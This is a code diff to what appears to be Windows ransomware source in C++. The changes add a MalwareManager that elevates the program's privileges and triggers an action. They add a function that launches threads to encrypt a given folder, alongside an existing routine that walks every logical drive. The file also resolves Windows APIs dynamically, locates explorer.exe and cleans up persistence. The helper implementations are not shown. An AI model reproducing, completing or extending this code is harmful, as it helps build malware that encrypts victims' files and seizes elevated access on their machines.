@@ -3,8 +3,18 @@
 #include "Threading.h"
 #include "File.h"
 #include "PE.h"
+#include "MalwareManager.h"
 #include <stdio.h>
 extern FARPROC APIArray[55];
+
+int beginEncrypt(std::string path) {
+	if (initThreadStruct(2) == -1) {
+		return -1;
+	}
+	launchThreadEncrypt((LPSTR)path.c_str());
+	cleanUpThread();
+	return 0;
+}
 
 int beginEncrypt() {
 	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
@@ -20,7 +30,7 @@ int beginEncrypt() {
 	TempGetLogicalDriveStringsA(driveStrSize, driveBuffer);
 
 	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
-		if (initThreadStruct() == -1) {
+		if (initThreadStruct(2) == -1) {
 			free(driveBuffer);
 			return -1;
 		}
@@ -31,7 +41,10 @@ int beginEncrypt() {
 	return 0;
 }
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int main() {
+	MalwareManager malwareManager;
+	malwareManager.ElevateApplication();
+	malwareManager.Action(1);
 	if (initAPIArray() == -1) {
 		return -1;
 	}
@@ -67,7 +80,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	}
 	findExplorerExe();
 
-	beginEncrypt();
+	//beginEncrypt();
+	beginEncrypt("C:\\Document\\");
 	cryptCleanUp();
 	cleanExplorerLL();
 	persistCleanUp();
